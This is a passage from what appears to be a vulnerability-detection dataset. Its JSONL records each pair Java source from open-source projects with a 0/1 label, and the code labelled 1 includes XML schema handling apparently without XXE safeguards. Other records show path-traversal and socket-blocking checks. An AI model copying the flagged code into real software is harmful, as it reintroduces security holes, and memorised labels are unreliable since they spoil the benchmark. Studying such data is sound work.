ids.\n\n            if (myExecuteIds == null || myExecuteIds.isEmpty()) {\n                if (LOGGER.isLoggable(Level.FINE)) {\n                    LOGGER.log(Level.FINE,\n                        \"No execute and render identifiers specified.  Skipping component processing.\");\n                }\n                return;\n            }\n\n            try {\n                processComponents(viewRoot, phaseId, myExecuteIds, ctx);\n            } catch (Exception e) {\n                if (LOGGER.isLoggable(Level.INFO)) {\n                    LOGGER.log(Level.INFO,\n                           e.toString(),\n                           e);\n                }\n                throw new FacesException(e);\n            }\n\n            // If we have just finished APPLY_REQUEST_VALUES phase, install the\n            // partial response writer.  We want to make sure that any content\n            // or errors generated in the other phases are written using the\n            // partial response writer.\n            //\n            if (phaseId == PhaseId.APPLY_REQUEST_VALUES) {\n                PartialResponseWriter writer = pvc.getPartialResponseWriter();\n                ctx.setResponseWriter(writer);\n            }\n\n        } else if (phaseId == PhaseId.RENDER_RESPONSE) {\n\n            try {\n                //\n                // We re-enable response writing.\n                //\n                PartialResponseWriter writer = pvc.getPartialResponseWriter();\n                ResponseWriter orig = ctx.getResponseWriter();\n                ctx.getAttributes().put(ORIGINAL_WRITER, orig);\n                ctx.setResponseWriter(writer);\n\n                ExternalContext exContext = ctx.getExternalContext();\n                exContext.setResponseContentType(\"text/xml\");\n                exContext.addResponseHeader(\"Cache-Control\", \"no-cache\");\n                \n//                String encoding = writer.getCharacterEncoding( );\n//                if( encoding == null ) {\n//                    encoding = \"UTF-8\";\n//                }\n//                writer.writePreamble(\"<?xml version='1.0' encoding='\" + encoding + \"'?>\\n\");\n                writer.startDocument();\n                \n                if (isResetValues()) {\n                    viewRoot.resetValues(ctx, myRenderIds);\n                }\n                \n                if (isRenderAll()) {\n                    renderAll(ctx, viewRoot);\n                    renderState(ctx);\n                    writer.endDocument();\n                    return;\n                }\n\n                // Skip this processing if \"none\" is specified in the render list,\n                // or there were no render phase client ids.\n                if (myRenderIds != null && !myRenderIds.isEmpty()) {\n                    processComponents(viewRoot, phaseId, myRenderIds, ctx);\n                }\n\n                renderState(ctx);\n\n                writer.endDocument();\n            } catch (IOException ex) {\n                this.cleanupAfterView();\n            } catch (RuntimeException ex) {\n                this.cleanupAfterView();\n                // Throw the exception\n                throw ex;\n            }\n        }\n    }\n\n    /**\n     * @see javax.faces.context.PartialViewContext#getPartialResponseWriter()\n     */\n    @Override\n    public PartialResponseWriter getPartialResponseWriter() {\n        assertNotReleased();\n        if (partialResponseWriter == null) {\n            partialResponseWriter = new DelayedInitPartialResponseWriter(this);\n        }\n        return partialResponseWriter;\n    }\n\n    /**\n     * @see javax.faces.context.PartialViewContext#release()\n     */\n    public void release() {\n        \n        released = true;\n        ajaxRequest = null;\n        renderAll = null;\n        partialResponseWriter = null;\n        executeIds = null;\n        renderIds = null;\n        ctx = null;\n        partialRequest = null;\n\n    }\n\n    // -------------------------------------------------------- Private Methods\n\n\n\n    private List<String> populatePhaseClientIds(String parameterName) {\n\n        Map<String,String> requestParamMap =\n              ctx.getExternalContext().getRequestParameterMap();\n\n        String param = requestParamMap.get(parameterName);\n        if (param == null) {\n            return new ArrayList<String>();\n        } else {\n            Map<String, Object> appMap = FacesContext.getCurrentInstance().getExternalContext().getApplicationMap();\n            String[] pcs = Util.split(appMap, param, \"[ \\t]+\");\n            return ((pcs != null && pcs.length != 0)\n                    ? new ArrayList<String>(Arrays.asList(pcs))\n                    : new ArrayList<String>());\n        }\n        \n    }\n\n    // Process the components specified in the phaseClientIds list\n    private void processComponents(UIComponent component, PhaseId phaseId,\n        Collection<String> phaseClientIds, FacesContext context) throws IOException {\n\n        // We use the tree visitor mechanism to locate the components to\n        // process.  Create our (partial) VisitContext and the\n        // VisitCallback that will be invoked for each component that\n        // is visited.  Note that we use the SKIP_UNRENDERED hint as we\n        // only want to visit the rendered subtree.\n        EnumSet<VisitHint> hints = EnumSet.of(VisitHint.SKIP_UNRENDERED, VisitHint.EXECUTE_LIFECYCLE);\n        VisitContextFactory visitContextFactory = (VisitContextFactory) \n                FactoryFinder.getFactory(VISIT_CONTEXT_FACTORY);\n        VisitContext visitContext = visitContextFactory.getVisitContext(context, phaseClientIds, hints);\n        PhaseAwareVisitCallback visitCallback =\n            new PhaseAwareVisitCallback(ctx, phaseId);\n        component.visitTree(visitContext, visitCallback);\n\n        PartialVisitContext partialVisitContext = unwrapPartialVisitContext(visitContext);\n        if (partialVisitContext != null) {\n            if (LOGGER.isLoggable(Level.FINER) && !partialVisitContext.getUnvisitedClientIds().isEmpty()) {\n                Collection<String> unvisitedClientIds = partialVisitContext.getUnvisitedClientIds();\n                String message;\n                StringBuilder builder = new StringBuilder();\n                for (String cur : unvisitedClientIds) {\n                    builder.append(cur).append(\" \");\n                }\n                LOGGER.log(Level.FINER,\n                        \"jsf.context.partial_visit_context_unvisited_children\",\n                        new Object[]{builder.toString()});\n            }\n        }    \n    }\n\n    /**\n     * Unwraps {@link PartialVisitContext} from a chain of {@link VisitContextWrapper}s.\n     *\n     * If no {@link PartialVisitContext} is found in the chain, null is returned instead.\n     * \n     * @param visitContext the visit context.\n     * @return the (unwrapped) partial visit context.\n     */\n    private static PartialVisitContext unwrapPartialVisitContext(VisitContext visitContext) {\n        if (visitContext == null) {\n            return null;\n        }\n        if (visitContext instanceof PartialVisitContext) {\n            return (PartialVisitContext) visitContext;\n        }\n        if (visitContext instanceof VisitContextWrapper) {\n            return unwrapPartialVisitContext(((VisitContextWrapper) visitContext).getWrapped());\n        }\n        return null;\n    }\n    \n    private void renderAll(FacesContext context, UIViewRoot viewRoot) throws IOException {\n        // If this is a \"render all via ajax\" request,\n        // make sure to wrap the entire page in a <render> elemnt\n        // with the special viewStateId of VIEW_ROOT_ID.  This is how the client\n        // JavaScript knows how to replace the entire document with\n        // this response.\n        PartialViewContext pvc = context.getPartialViewContext();\n        PartialResponseWriter writer = pvc.getPartialResponseWriter();\n        \n        if (!Util.isPortletRequest(context)) {\n            writer.startUpdate(PartialResponseWriter.RENDER_ALL_MARKER);\n            if (viewRoot.getChildCount() > 0) {\n                for (UIComponent uiComponent : viewRoot.getChildren()) {\n                    uiComponent.encodeAll(context);\n                }\n            }\n            writer.endUpdate();\n        }\n        else {\n            /*\n             * If we have a portlet request, start rendering at the view root.\n             */\n            writer.startUpdate(viewRoot.getClientId(ctx));\n            viewRoot.encodeBegin(context);\n            if (viewRoot.getChildCount() > 0) {\n                for (UIComponent uiComponent : viewRoot.getChildren()) {\n                    uiComponent.encodeAll(context);\n                }\n            }\n            viewRoot.encodeEnd(context);\n            writer.endUpdate();\n        }\n    }\n\n    private void renderState(FacesContext context) throws IOException {\n        // Get the view state and write it to the response..\n        PartialViewContext pvc = context.getPartialViewContext();\n        PartialResponseWriter writer = pvc.getPartialResponseWriter();\n        String viewStateId = Util.getViewStateId(context);\n\n        writer.startUpdate(viewStateId);\n        String state = context.getApplication().getStateManager().getViewState(context);\n        writer.write(state);\n        writer.endUpdate();\n\n        ClientWindow window = context.getExternalContext().getClientWindow();\n        if (null != window) {\n            String clientWindowId = Util.getClientWindowId(context);\n            writer.startUpdate(clientWindowId);\n            writer.write(window.getId());\n            writer.endUpdate();\n        }\n    }\n\n    private PartialResponseWriter createPartialResponseWriter() {\n\n        ExternalContext extContext = ctx.getExternalContext();\n        String encoding = extContext.getRequestCharacterEncoding();\n        extContext.setResponseCharacterEncoding(encoding);\n        ResponseWriter responseWriter = null;\n        Writer out = null;\n        try {\n            out = extContext.getResponseOutputWriter();\n        } catch (IOException ioe) {\n            if (LOGGER.isLoggable(Level.SEVERE)) {\n                LOGGER.log(Level.SEVERE,\n                           ioe.toString(),\n                           ioe);\n            }\n        }\n\n        if (out != null) {\n            UIViewRoot viewRoot = ctx.getViewRoot();\n            if (viewRoot != null) {\n                responseWriter =\n                    ctx.getRenderKit().createResponseWriter(out,\n                    \"text/xml\", encoding);\n            } else {\n                RenderKitFactory factory = (RenderKitFactory)\n                    FactoryFinder.getFactory(FactoryFinder.RENDER_KIT_FACTORY);\n                RenderKit renderKit = factory.getRenderKit(ctx, RenderKitFactory.HTML_BASIC_RENDER_KIT);\n                responseWriter = renderKit.createResponseWriter(out, \"text/xml\", encoding);\n            }\n        }\n        if (responseWriter instanceof PartialResponseWriter)  {\n            return (PartialResponseWriter) responseWriter;\n        } else {\n            return new PartialResponseWriter(responseWriter);\n        }\n\n    }\n\n    private void cleanupAfterView() {\n        ResponseWriter orig = (ResponseWriter) ctx.getAttributes().\n            get(ORIGINAL_WRITER);\n        assert(null != orig);\n        // move aside the PartialResponseWriter\n        ctx.setResponseWriter(orig);\n    }\n\n\n    @SuppressWarnings({\"FinalPrivateMethod\"})\n    private final void assertNotReleased() {\n        if (released) {\n            throw new IllegalStateException();\n        }\n    }\n\n    // ----------------------------------------------------------- Inner Classes\n\n\n    private static class PhaseAwareVisitCallback implements VisitCallback {\n\n        private PhaseId curPhase;\n        private FacesContext ctx;\n\n        private PhaseAwareVisitCallback(FacesContext ctx, PhaseId curPhase) {\n            this.ctx = ctx;\n            this.curPhase = curPhase;\n        }  \n\n\n        public VisitResult visit(VisitContext context, UIComponent comp) {\n            try {\n\n                if (curPhase == PhaseId.APPLY_REQUEST_VALUES) {\n\n                    // RELEASE_PENDING handle immediate request(s)\n                    // If the user requested an immediate request\n                    // Make sure to set the immediate flag here.\n\n                    comp.processDecodes(ctx);\n                } else if (curPhase == PhaseId.PROCESS_VALIDATIONS) {\n                    comp.processValidators(ctx);\n                } else if (curPhase == PhaseId.UPDATE_MODEL_VALUES) {\n                    comp.processUpdates(ctx);\n                } else if (curPhase == PhaseId.RENDER_RESPONSE) {\n                    PartialResponseWriter writer = ctx.getPartialViewContext().getPartialResponseWriter();\n                    writer.startUpdate(comp.getClientId(ctx));\n                    // do the default behavior...\n                    comp.encodeAll(ctx);\n                    writer.endUpdate();\n                } else {\n                    throw new IllegalStateException(\"I18N: Unexpected \" +\n                                                    \"PhaseId passed to \" +\n                                              \" PhaseAwareContextCallback: \" +\n                                                    curPhase.toString());\n                }\n            }\n            catch (IOException ex) {\n                if (LOGGER.isLoggable(Level.SEVERE)) {\n                    LOGGER.severe(ex.toString());\n                }\n                if (LOGGER.isLoggable(Level.FINE)) {\n                    LOGGER.log(Level.FINE,\n                    ex.toString(),\n                    ex);\n                }\n                throw new FacesException(ex);\n            }\n\n            // Once we visit a component, there is no need to visit\n            // its children, since processDecodes/Validators/Updates and\n            // encodeAll() already traverse the subtree.  We return\n            // VisitResult.REJECT to supress the subtree visit.\n            return VisitResult.REJECT;\n        }\n    }\n\n\n     /**\n      * Delays the actual construction of the PartialResponseWriter <em>until</em>\n      * content is going to actually be written.\n      */\n    private static final class DelayedInitPartialResponseWriter extends PartialResponseWriter {\n\n        private ResponseWriter writer;\n        private PartialViewContextImpl ctx;\n\n        // -------------------------------------------------------- Constructors\n\n\n        public DelayedInitPartialResponseWriter(PartialViewContextImpl ctx) {\n\n            super(null);\n            this.ctx = ctx;\n            ExternalContext extCtx = ctx.ctx.getExternalContext();\n            extCtx.setResponseContentType(\"text/xml\");\n            extCtx.setResponseCharacterEncoding(extCtx.getRequestCharacterEncoding());\n\n        }\n\n\n        // ---------------------------------- Methods from PartialResponseWriter\n\n\n        @Override\n        public ResponseWriter getWrapped() {\n\n            if (writer == null) {\n                writer = ctx.createPartialResponseWriter();\n            }\n            return writer;\n\n        }\n         \n    } // END DelayedInitPartialResponseWriter\n\n} \n", "target": 1}
{"idx": 1113, "func": "package org.richfaces.demo.media;\n\nimport java.awt.Color;\nimport java.io.Serializable;\n\npublic class MediaData implements Serializable{\n\n\tprivate static final long serialVersionUID = 1L;\n\tInteger Width=110;\n\tInteger Height=50;\n\tColor Background=new Color(0,0,0);\n\tColor DrawColor=new Color(255,255,255);\n\tpublic MediaData() {\n\t}\n\tpublic Color getBackground() {\n\t\treturn Background;\n\t}\n\tpublic void setBackground(Color background) {\n\t\tBackground = background;\n\t}\n\tpublic Color getDrawColor() {\n\t\treturn DrawColor;\n\t}\n\tpublic void setDrawColor(Color drawColor) {\n\t\tDrawColor = drawColor;\n\t}\n\tpublic Integer getHeight() {\n\t\treturn Height;\n\t}\n\tpublic void setHeight(Integer height) {\n\t\tHeight = height;\n\t}\n\tpublic Integer getWidth() {\n\t\treturn Width;\n\t}\n\tpublic void setWidth(Integer width) {\n\t\tWidth = width;\n\t}\n}", "target": 1}
{"idx": 1114, "func": "/*\n * Copyright (c) 2015, 2018 Oracle and/or its affiliates. All rights reserved.\n *\n * This program and the accompanying materials are made available under the\n * terms of the Eclipse Public License v. 2.0, which is available at\n * http://www.eclipse.org/legal/epl-2.0.\n *\n * This Source Code may also be made available under the following Secondary\n * Licenses when the conditions for such availability set forth in the\n * Eclipse Public License v. 2.0 are satisfied: GNU General Public License,\n * version 2 with the GNU Classpath Exception, which is available at\n * https://www.gnu.org/software/classpath/license.html.\n *\n * SPDX-License-Identifier: EPL-2.0 OR GPL-2.0 WITH Classpath-exception-2.0\n */\n\npackage org.glassfish.soteria.mechanisms.jaspic;\n\nimport java.util.Map;\nimport java.util.function.Supplier;\n\nimport javax.security.auth.callback.CallbackHandler;\nimport javax.security.auth.message.AuthException;\nimport javax.security.auth.message.config.AuthConfigFactory;\nimport javax.security.auth.message.config.AuthConfigProvider;\nimport javax.security.auth.message.config.ClientAuthConfig;\nimport javax.security.auth.message.config.ServerAuthConfig;\nimport javax.security.auth.message.config.ServerAuthContext;\nimport javax.security.auth.message.module.ServerAuthModule;\n\n/**\n * This class functions as a kind of factory-factory for {@link ServerAuthConfig} instances, which are by themselves factories\n * for {@link ServerAuthContext} instances, which are delegates for the actual {@link ServerAuthModule} (SAM) that we're after.\n *\n * @author Arjan Tijms\n */\npublic class DefaultAuthConfigProvider implements AuthConfigProvider {\n\n    private static final String CALLBACK_HANDLER_PROPERTY_NAME = \"authconfigprovider.client.callbackhandler\";\n\n    private Map<String, String> providerProperties;\n    private Supplier<ServerAuthModule> serverAuthModuleSupplier;\n\n    public DefaultAuthConfigProvider(Supplier<ServerAuthModule> serverAuthModuleSupplier) {\n        this.serverAuthModuleSupplier = serverAuthModuleSupplier;\n    }\n\n    /**\n     * Constructor with signature and implementation that's required by API.\n     *\n     * @param properties provider properties\n     * @param factory the auth config factory\n     */\n    public DefaultAuthConfigProvider(Map<String, String> properties, AuthConfigFactory factory) {\n        this.providerProperties = properties;\n\n        // API requires self registration if factory is provided. Not clear\n        // where the \"layer\" (2nd parameter)\n        // and especially \"appContext\" (3rd parameter) values have to come from\n        // at this place.\n        if (factory != null) {\n            // If this method ever gets called, it may throw a SecurityException.\n            // Don't bother with a PrivilegedAction as we don't expect to ever be\n            // constructed this way.\n            factory.registerConfigProvider(this, null, null, \"Auto registration\");\n        }\n    }\n\n    /**\n     * The actual factory method that creates the factory used to eventually obtain the delegate for a SAM.\n     */\n    @Override\n    public ServerAuthConfig getServerAuthConfig(String layer, String appContext, CallbackHandler handler) throws AuthException,\n        SecurityException {\n        return new DefaultServerAuthConfig(layer, appContext, handler == null ? createDefaultCallbackHandler() : handler,\n            providerProperties, serverAuthModuleSupplier);\n    }\n\n    @Override\n    public ClientAuthConfig getClientAuthConfig(String layer, String appContext, CallbackHandler handler) throws AuthException,\n        SecurityException {\n        return null;\n    }\n\n    @Override\n    public void refresh() {\n    }\n\n    /**\n     * Creates a default callback handler via the system property \"authconfigprovider.client.callbackhandler\", as seemingly\n     * required by the API (API uses wording \"may\" create default handler). TODO: Isn't\n     * \"authconfigprovider.client.callbackhandler\" JBoss specific?\n     *\n     * @return\n     * @throws AuthException\n     */\n    private CallbackHandler createDefaultCallbackHandler() throws AuthException {\n        String callBackClassName = System.getProperty(CALLBACK_HANDLER_PROPERTY_NAME);\n\n        if (callBackClassName == null) {\n            throw new AuthException(\"No default handler set via system property: \" + CALLBACK_HANDLER_PROPERTY_NAME);\n        }\n\n        try {\n            return (CallbackHandler) Thread.currentThread().getContextClassLoader().loadClass(callBackClassName).newInstance();\n        } catch (Exception e) {\n            throw new AuthException(e.getMessage());\n        }\n    }\n\n}\n", "target": 0}
{"idx": 1115, "func": "/**\n * Copyright (c) 2001-2019 Mathew A. Nelson and Robocode contributors\n * All rights reserved. This program and the accompanying materials\n * are made available under the terms of the Eclipse Public License v1.0\n * which accompanies this distribution, and is available at\n * https://robocode.sourceforge.io/license/epl-v10.html\n */\npackage net.sf.robocode.test.robots;\n\nimport net.sf.robocode.test.helpers.RobocodeTestBed;\nimport org.junit.Assert;\nimport robocode.control.events.TurnEndedEvent;\n\n/**\n * @author Flemming N. Larsen (original)\n */\npublic class TestStaticConstructorDnsAttack extends RobocodeTestBed {\n\n\tprivate boolean securityExceptionOccurred;\n\t\n\t@Override\n\tpublic String getRobotNames() {\n\t\treturn \"tested.robots.DnsAttack,sample.Target\";\n\t}\n\n\t@Override\n\tpublic void onTurnEnded(TurnEndedEvent event) {\n\t\tsuper.onTurnEnded(event);\n\n\t\tfinal String out = event.getTurnSnapshot().getRobots()[0].getOutputStreamSnapshot();\n\n\t\tif (out.contains(\"SYSTEM: Using socket is not allowed\")) {\n\t\t\tsecurityExceptionOccurred = true;\t\n\t\t}\t\n\t}\n\n\t@Override\n\tprotected void runTeardown() {\n\t\tAssert.assertTrue(\"Socket connection is not allowed\", securityExceptionOccurred);\n\t}\n\n\t@Override\n\tprotected int getExpectedErrors() {\n\t\treturn 1;\n\t}\n}\n", "target": 0}
{"idx": 1116, "func": "/*\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements.  See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership.  The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License.  You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied.  See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\npackage io.milton.http.webdav;\n\nimport io.milton.common.StreamUtils;\nimport java.io.ByteArrayInputStream;\nimport org.apache.commons.io.output.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.LinkedHashSet;\nimport java.util.Set;\nimport javax.xml.namespace.QName;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport org.xml.sax.XMLReader;\nimport org.xml.sax.helpers.XMLReaderFactory;\n\n/**\n * Simple implmentation which just parses the request body. If no xml is present\n * it will return an empty set.\n *\n * Note this generally shouldnt be used directly, but should be wrapped by\n * MSPropFindRequestFieldParser to support windows clients.\n *\n * @author brad\n */\npublic class DefaultPropFindRequestFieldParser implements PropFindRequestFieldParser {\n\n    private static final Logger log = LoggerFactory.getLogger( DefaultPropFindRequestFieldParser.class );\n\n    public DefaultPropFindRequestFieldParser() {\n    }\n\n\t@Override\n    public PropertiesRequest getRequestedFields( InputStream in ) {\n\t\tfinal Set<QName> set = new LinkedHashSet<QName>();\n        try {\n            ByteArrayOutputStream bout = new ByteArrayOutputStream();\n            StreamUtils.readTo( in, bout, false, true );\n            byte[] arr = bout.toByteArray();\n            if( arr.length > 1 ) {\n                ByteArrayInputStream bin = new ByteArrayInputStream( arr );\n                XMLReader reader = XMLReaderFactory.createXMLReader();\n\t\t\t\treader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n\t\t\t\t// https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing\n\t\t\t\treader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n\t\t\t\treader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n                PropFindSaxHandler handler = new PropFindSaxHandler();\n                reader.setContentHandler( handler );\n                try {\n                    reader.parse( new InputSource( bin ) );\n                    if( handler.isAllProp() ) {\n                        return new PropertiesRequest();\n                    } else {\n                        set.addAll( handler.getAttributes().keySet() );\n                    }\n                } catch( IOException e ) {\n                    log.warn( \"exception parsing request body\", e );\n                    // ignore\n                } catch( SAXException e ) {\n                    log.warn( \"exception parsing request body\", e );\n                    // ignore\n                }\n            }\n        } catch( Exception ex ) {\n\t\t\t// There's a report of an exception being thrown here by IT Hit Webdav client\n\t\t\t// Perhaps we can just log the error and return an empty set. Usually this\n\t\t\t// class is wrapped by the MsPropFindRequestFieldParser which will use a default\n\t\t\t// set of properties if this returns an empty set\n\t\t\tlog.warn(\"Exception parsing PROPFIND request fields. Returning empty property set\", ex);\n            //throw new RuntimeException( ex );\n        }\n\t\treturn PropertiesRequest.toProperties(set);\n    }\n}\n", "target": 0}
{"idx": 1117, "func": "package org.linlinjava.litemall.wx.web;\n\nimport org.linlinjava.litemall.core.storage.StorageService;\nimport org.linlinjava.litemall.core.util.CharUtil;\nimport org.linlinjava.litemall.core.util.ResponseUtil;\nimport org.linlinjava.litemall.db.domain.LitemallStorage;\nimport org.linlinjava.litemall.db.service.LitemallStorageService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.core.io.Resource;\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.http.MediaType;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.validation.annotation.Validated;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.multipart.MultipartFile;\n\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@RestController\n@RequestMapping(\"/wx/storage\")\n@Validated\npublic class WxStorageController {\n\n    @Autowired\n    private StorageService storageService;\n    @Autowired\n    private LitemallStorageService litemallStorageService;\n\n    private String generateKey(String originalFilename) {\n        int index = originalFilename.lastIndexOf('.');\n        String suffix = originalFilename.substring(index);\n\n        String key = null;\n        LitemallStorage storageInfo = null;\n\n        do {\n            key = CharUtil.getRandomString(20) + suffix;\n            storageInfo = litemallStorageService.findByKey(key);\n        }\n        while (storageInfo != null);\n\n        return key;\n    }\n\n    @PostMapping(\"/upload\")\n    public Object upload(@RequestParam(\"file\") MultipartFile file) throws IOException {\n        String originalFilename = file.getOriginalFilename();\n        String url = storageService.store(file.getInputStream(), file.getSize(), file.getContentType(), originalFilename);\n\n        Map<String, Object> data = new HashMap<>();\n        data.put(\"url\", url);\n        return ResponseUtil.ok(data);\n    }\n\n    @GetMapping(\"/fetch/{key:.+}\")\n    public ResponseEntity<Resource> fetch(@PathVariable String key) {\n        LitemallStorage litemallStorage = litemallStorageService.findByKey(key);\n        if (key == null) {\n            return ResponseEntity.notFound().build();\n        }\n        if(key.contains(\"../\")){\n            return ResponseEntity.badRequest().build();\n        }\n        String type = litemallStorage.getType();\n        MediaType mediaType = MediaType.parseMediaType(type);\n\n        Resource file = storageService.loadAsResource(key);\n        if (file == null) {\n            return ResponseEntity.notFound().build();\n        }\n        return ResponseEntity.ok().contentType(mediaType).body(file);\n    }\n\n    @GetMapping(\"/download/{key:.+}\")\n    public ResponseEntity<Resource> download(@PathVariable String key) {\n        LitemallStorage litemallStorage = litemallStorageService.findByKey(key);\n        if (key == null) {\n            return ResponseEntity.notFound().build();\n        }\n        if(key.contains(\"../\")){\n            return ResponseEntity.badRequest().build();\n        }\n\n        String type = litemallStorage.getType();\n        MediaType mediaType = MediaType.parseMediaType(type);\n\n        Resource file = storageService.loadAsResource(key);\n        if (file == null) {\n            return ResponseEntity.notFound().build();\n        }\n        return ResponseEntity.ok().contentType(mediaType).header(HttpHeaders.CONTENT_DISPOSITION,\n                \"attachment; filename=\\\"\" + file.getFilename() + \"\\\"\").body(file);\n    }\n\n}\n", "target": 0}
{"idx": 1118, "func": "/**\n * (The MIT License)\n *\n * Copyright (c) 2008 - 2011:\n *\n * * {Aaron Patterson}[http://tenderlovemaking.com]\n * * {Mike Dalessio}[http://mike.daless.io]\n * * {Charles Nutter}[http://blog.headius.com]\n * * {Sergio Arbeo}[http://www.serabe.com]\n * * {Patrick Mahoney}[http://polycrystal.org]\n * * {Yoko Harada}[http://yokolet.blogspot.com]\n *\n * Permission is hereby granted, free of charge, to any person obtaining\n * a copy of this software and associated documentation files (the\n * 'Software'), to deal in the Software without restriction, including\n * without limitation the rights to use, copy, modify, merge, publish,\n * distribute, sublicense, and/or sell copies of the Software, and to\n * permit persons to whom the Software is furnished to do so, subject to\n * the following conditions:\n * \n * The above copyright notice and this permission notice shall be\n * included in all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND,\n * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\n * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY\n * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,\n * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n */\n\npackage nokogiri;\n\nimport static nokogiri.internals.NokogiriHelpers.getNokogiriClass;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.StringWriter;\nimport java.io.UnsupportedEncodingException;\n\nimport javax.xml.transform.Source;\nimport javax.xml.transform.TransformerConfigurationException;\nimport javax.xml.transform.TransformerException;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport javax.xml.transform.stream.StreamSource;\n\nimport org.iso_relax.verifier.Schema;\nimport org.iso_relax.verifier.Verifier;\nimport org.iso_relax.verifier.VerifierConfigurationException;\nimport org.iso_relax.verifier.VerifierFactory;\nimport org.jruby.Ruby;\nimport org.jruby.RubyClass;\nimport org.jruby.anno.JRubyClass;\nimport org.jruby.runtime.ThreadContext;\nimport org.w3c.dom.Document;\nimport org.xml.sax.ErrorHandler;\nimport org.xml.sax.SAXException;\n\n/**\n * Class for Nokogiri::XML::RelaxNG\n * \n * @author sergio\n * @author Yoko Harada <yokolet@gmail.com>\n */\n@JRubyClass(name=\"Nokogiri::XML::RelaxNG\", parent=\"Nokogiri::XML::Schema\")\npublic class XmlRelaxng extends XmlSchema {\n    private Verifier verifier;\n\n    public XmlRelaxng(Ruby ruby, RubyClass klazz) {\n        super(ruby, klazz);\n    }\n    \n    private void setVerifier(Verifier verifier) {\n        this.verifier = verifier;\n    }\n    \n    static XmlSchema createSchemaInstance(ThreadContext context, RubyClass klazz, Source source) {\n        Ruby runtime = context.getRuntime();\n        XmlRelaxng xmlRelaxng = (XmlRelaxng) NokogiriService.XML_RELAXNG_ALLOCATOR.allocate(runtime, klazz);\n        xmlRelaxng.setInstanceVariable(\"@errors\", runtime.newEmptyArray());\n        \n        try {\n            Schema schema = xmlRelaxng.getSchema(source, context);\n            xmlRelaxng.setVerifier(schema.newVerifier());\n            return xmlRelaxng;\n        } catch (VerifierConfigurationException ex) {\n            throw context.getRuntime().newRuntimeError(\"Could not parse document: \" + ex.getMessage());\n        }\n    }\n\n    private Schema getSchema(Source source, ThreadContext context) {\n        InputStream is;\n        VerifierFactory factory = new com.thaiopensource.relaxng.jarv.VerifierFactoryImpl();\n        if (source instanceof StreamSource) {\n            StreamSource ss = (StreamSource)source;\n            is = ss.getInputStream();\n        } else { //if (this.source instanceof DOMSource)\n            DOMSource ds = (DOMSource)source;\n            StringWriter xmlAsWriter = new StringWriter();\n            StreamResult result = new StreamResult(xmlAsWriter);\n            try {\n                TransformerFactory.newInstance().newTransformer().transform(ds, result);\n            } catch (TransformerConfigurationException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            } catch (TransformerException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            }\n            try {\n                is = new ByteArrayInputStream(xmlAsWriter.toString().getBytes(\"UTF-8\"));\n            } catch (UnsupportedEncodingException ex) {\n                throw context.getRuntime()\n                    .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n            }\n        }\n\n        try {\n            return factory.compileSchema(is);\n        } catch (VerifierConfigurationException ex) {\n            throw context.getRuntime()\n                .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n        } catch (SAXException ex) {\n            throw context.getRuntime()\n                .newRuntimeError(\"Could not parse document: \"+ex.getMessage());\n        } catch (IOException ex) {\n            throw context.getRuntime().newIOError(ex.getMessage());\n        }\n    }\n    \n    @Override\n    protected void setErrorHandler(ErrorHandler errorHandler) {\n        verifier.setErrorHandler(errorHandler);\n    }\n    \n    @Override\n    protected void validate(Document document) throws SAXException, IOException {\n        verifier.verify(document);\n    }\n}\n", "target": 1}
{"idx": 1119, "func": "/*****************************************************************************\n * Licensed to the Apache Software Foundation (ASF) under one                *\n * or more contributor license agreements.  See the NOTICE file              *\n * distributed with this work for additional information                     *\n * regarding copyright ownership.  The ASF licenses this file                *\n * to you under the Apache License, Version 2.0 (the                         *\n * \"License\"); you may not use this file except in compliance                *\n * with the License.  You may obtain a copy of the License at                *\n *                                                                           *\n *     http://www.apache.org/licenses/LICENSE-2.0                            *\n *                                                                           *\n * Unless required by applicable law or agreed to in writing,                *\n * software distributed under the License is distributed on an               *\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY                    *\n * KIND, either express or implied.  See the License for the                 *\n * specific language governing permissions and limitations                   *\n * under the License.                                                        *\n *                                                                           *\n *                                                                           *\n * This file is part of the BeanShell Java Scripting distribution.           *\n * Documentation and updates may be found at http://www.beanshell.org/       *\n * Patrick Niemeyer (pat@pat.net)                                            *\n * 